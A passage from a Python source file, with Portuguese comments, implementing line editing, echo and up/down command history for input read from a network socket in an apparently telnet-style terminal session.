            return False

        # --------------------------------------------------------
        # HOME
        # --------------------------------------------------------

        if key == "home":

            if cursor > 0:
                cursor = 0

            return False

        # --------------------------------------------------------
        # END
        # --------------------------------------------------------

        if key == "end":

            cursor = len(caracteres)

            return False

        # --------------------------------------------------------
        # DELETE
        # --------------------------------------------------------

        if key == "delete":

            if 0 <= cursor < len(caracteres):
                caracteres.pop(cursor)

            return False

        # --------------------------------------------------------
        # UP
        # --------------------------------------------------------

        if key == KEY_UP:

            if not user:
                return False

            history = get_history()

            if not history:
                return False

            if lcmd >= len(history):
                return False

            lcmd += 1

            clear_line()

            caracteres.clear()

            try:
                entry = history[len(history) - lcmd]
                text = history_to_text(entry)

            except (IndexError, KeyError, TypeError):
                lcmd = 0
                cursor = 0
                return False

            caracteres.extend(text)
            cursor = len(caracteres)

            send(sock, text)

            return False

        # --------------------------------------------------------
        # DOWN
        # --------------------------------------------------------

        if key == KEY_DOWN:

            if not user:
                return False

            history = get_history()

            if not history:
                return False

            if lcmd <= 0:
                return False

            lcmd -= 1

            clear_line()

            caracteres.clear()

            if lcmd == 0:
                cursor = 0
                return False

            try:
                entry = history[len(history) - lcmd]
                text = history_to_text(entry)

            except (IndexError, KeyError, TypeError):
                cursor = 0
                return False

            caracteres.extend(text)
            cursor = len(caracteres)

            send(sock, text)

            return False

        return False

    # ============================================================
    # LOOP PRINCIPAL
    # ============================================================

    while "\r" not in caracteres and len(caracteres) <= limit:

        # --------------------------------------------------------
        # Recebe bytes
        # --------------------------------------------------------

        try:
            recv = sock.recv(lenght)

        except (ConnectionResetError, BrokenPipeError, OSError):
            break

        if not recv:
            break

        buffer.extend(recv)

        debug_log(
            f"recv={recv!r} buffer={bytes(buffer)!r}"
        )

        # --------------------------------------------------------
        # Processa tudo que já estiver completo no buffer
        # --------------------------------------------------------

        while buffer:

            kind, value = parse_input()

            # Precisamos de mais bytes.
            if kind is None:
                break

            # ----------------------------------------------------
            # CARACTERE NORMAL
            # ----------------------------------------------------

            if kind == "text":

                if len(caracteres) >= limit:
                    break

                caracteres.append(value)
                cursor = len(caracteres)

                if returnset is False:
                    send(sock, value)

                else:
                    send(
                        sock,
                        returnset.replace("%c", value)
                    )

            # ----------------------------------------------------
            # TECLA ESPECIAL
            # ----------------------------------------------------

            elif kind == "key":

                should_echo = process_key(value)

                if value == KEY_ENTER:

                    if returnset is False:
                        send(sock, "\n")
                    else:
                        send(sock, "\n")

                elif value == KEY_BACKSPACE:

                    if should_echo:
                        if returnset is False:
                            send(sock, b"\b \b")
                        else:
                            send(sock, "\x7f")

                elif should_echo:
                    send_echo(value)

            # ----------------------------------------------------
            # REJEITADO
            # ----------------------------------------------------

            elif kind == "reject":

                debug_log(
                    f"rejected={value!r}"
                )

                continue

    # ============================================================
    # RESULTADO
    # ============================================================

    result = "".join(caracteres).replace("\r", "")

    if user and debug:

        history = get_history()

        print(
            f"{result} | "
            f"text: {result} | "
            f"cursor state: {cursor} | "
            f"cmd state: {lcmd} / "
            f"{len(history) - lcmd}"
        )

    return result

